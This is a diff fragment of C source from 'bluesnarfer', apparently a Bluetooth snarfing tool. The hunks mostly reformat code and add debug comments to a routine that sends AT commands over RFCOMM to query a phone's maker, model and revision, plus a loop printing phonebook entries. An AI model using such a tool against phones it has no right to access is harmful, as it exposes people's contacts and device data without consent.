+                                printf("%s", pbd[i]);
+
+                                break;
+                        }
+                }
+
+                if (!phonebook[i])
+                        printf("%s - Unknow phonebook list\n", ptr);
+
+                ptr = c + 1;
+        }
 }
 
-int info_cmd(FILE *fd) { 
+int info_cmd(FILE *fd) {
 
-	char buffer[128], *p; 
+        char buffer[128], *p;
 
-	snprintf(buffer, 128, "AT+CGMI\r\n");
-    if ( !fwrite(buffer, strlen(buffer), 1, fd) ) {
+        snprintf(buffer, 128, "AT+CGMI\r\n");
+        //fprintf(stderr, "calling fwrite()\n");
+        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
 
-    	fprintf(stderr, "bluesnarfer: fwrite failed\n");
-		return -1;
-	}
-	p = rfcomm_read(fd, buffer);
-	printf("%s", p);
+                fprintf(stderr, "bluesnarfer: fwrite failed\n");
+                return -1;
+        }
+	//fprintf(stderr, "calling rfcomm_read(fd, buffer)\n");
+        p = rfcomm_read(fd, buffer);
+        fprintf(stderr, "%s\n", p);
 
-	snprintf(buffer, 128, "AT+CGMM\r\n");
-    if ( !fwrite(buffer, strlen(buffer), 1, fd) ) {
-                                                        
-    	fprintf(stderr, "bluesnarfer: fwrite failed\n");
-		return -1;
-	}
-	p = rfcomm_read(fd, buffer);
-	printf("%s", p);
+        snprintf(buffer, 128, "AT+CGMM\r\n");
+        //fprintf(stderr, "calling fwrite()\n");
+        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
 
-	snprintf(buffer, 128, "AT+CGMR\r\n");
-    if ( !fwrite(buffer, strlen(buffer), 1, fd) ) {
+                fprintf(stderr, "bluesnarfer: fwrite failed\n");
+                return -1;
+        }
+	//fprintf(stderr, "calling rfcomm_read(fd, buffer)\n");
+        p = rfcomm_read(fd, buffer);
+        fprintf(stderr, "%s\n", p);
 
-    	fprintf(stderr, "bluesnarfer: fwrite failed\n");
-		return -1;
-	}
-	p = rfcomm_read(fd, buffer);
-	printf("%s\n", p);
+        snprintf(buffer, 128, "AT+CGMR\r\n");
+        //fprintf(stderr, "calling fwrite()\n");
+        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
 
+                fprintf(stderr, "bluesnarfer: fwrite failed\n");
+                return -1;
+        }
+	//fprintf(stderr, "calling rfcomm_read(fd, buffer)\n");
+        p = rfcomm_read(fd, buffer);
+        fprintf(stderr, "%s\n", p);
 
-
-
-	return 0;
+        return 0;
 }
